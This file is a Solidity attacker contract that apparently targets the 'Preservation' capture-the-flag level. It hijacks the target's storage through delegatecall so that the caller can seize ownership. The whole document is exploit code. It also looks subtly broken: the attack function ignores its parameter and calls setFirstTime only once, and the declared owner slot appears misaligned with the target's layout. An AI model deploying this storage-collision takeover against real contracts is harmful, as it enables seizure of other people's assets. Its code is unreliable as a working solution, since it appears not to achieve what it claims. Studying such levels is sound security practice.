// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Preservation.sol";

contract PreservationAttacker {
    Preservation public preservation;

    address public slot1; 
    address public slot2; 
    address public owner;

    constructor(address _preservationAddress) {
        preservation = Preservation(_preservationAddress);
    }

    function attack(address ) public {
        uint256 slotOAddress = uint256(uint160(address(this)));
        preservation.setFirstTime(slotOAddress);
    }

    function setTime(uint256 _time) public {
        owner = address(uint160(_time));
    }
}
